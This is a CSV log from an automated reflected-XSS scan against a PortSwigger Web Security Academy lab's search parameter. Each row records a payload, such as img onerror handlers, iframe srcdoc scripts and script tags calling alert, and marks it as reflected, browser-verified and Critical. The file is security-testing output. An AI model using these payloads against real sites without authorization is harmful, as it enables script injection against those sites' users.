Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:23:36.167,2026-01-10 14:23:36.337,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:36.337,2026-01-10 14:23:36.638,0.301,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:36.638,2026-01-10 14:23:36.809,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:36.809,2026-01-10 14:23:36.983,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:36.983,2026-01-10 14:23:37.279,0.296,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:37.279,2026-01-10 14:23:37.601,0.323,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:37.601,2026-01-10 14:23:37.772,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:37.772,2026-01-10 14:23:38.079,0.307,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:38.079,2026-01-10 14:23:38.245,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:38.245,2026-01-10 14:23:38.558,0.313,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:38.558,2026-01-10 14:23:38.878,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:38.878,2026-01-10 14:23:39.045,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:39.045,2026-01-10 14:23:39.253,0.208,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:39.253,2026-01-10 14:23:39.518,0.265,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:39.518,2026-01-10 14:23:39.838,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:39.838,2026-01-10 14:23:40.157,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:40.157,2026-01-10 14:23:40.477,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:40.477,2026-01-10 14:23:40.647,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:40.647,2026-01-10 14:23:40.817,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:40.817,2026-01-10 14:23:41.118,0.301,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:41.118,2026-01-10 14:23:41.286,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:41.286,2026-01-10 14:23:41.606,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:41.606,2026-01-10 14:23:41.918,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:41.918,2026-01-10 14:23:42.087,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:42.087,2026-01-10 14:23:42.398,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:42.398,2026-01-10 14:23:42.569,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:42.569,2026-01-10 14:23:42.740,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:42.740,2026-01-10 14:23:42.910,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:42.910,2026-01-10 14:23:43.199,0.289,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:43.199,2026-01-10 14:23:43.364,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<acronym onmouseover=alert(1)>X</acronym>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:43.364,2026-01-10 14:23:43.679,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:43.679,2026-01-10 14:23:43.843,0.164,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:43.843,2026-01-10 14:23:44.006,0.163,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:44.006,2026-01-10 14:23:44.179,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<font onmouseover=alert(1)>X</font>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:44.179,2026-01-10 14:23:44.345,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:44.345,2026-01-10 14:23:44.515,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:44.515,2026-01-10 14:23:44.798,0.283,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:44.798,2026-01-10 14:23:44.967,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:44.967,2026-01-10 14:23:45.133,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:45.133,2026-01-10 14:23:45.438,0.305,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:45.438,2026-01-10 14:23:45.604,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:45.604,2026-01-10 14:23:45.924,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:45.925,2026-01-10 14:23:46.238,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:46.238,2026-01-10 14:23:46.407,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:46.407,2026-01-10 14:23:46.718,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:46.718,2026-01-10 14:23:46.888,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:46.888,2026-01-10 14:23:47.199,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:47.199,2026-01-10 14:23:47.364,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:47.364,2026-01-10 14:23:47.678,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:47.679,2026-01-10 14:23:47.849,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:47.849,2026-01-10 14:23:48.158,0.309,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:48.158,2026-01-10 14:23:48.332,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
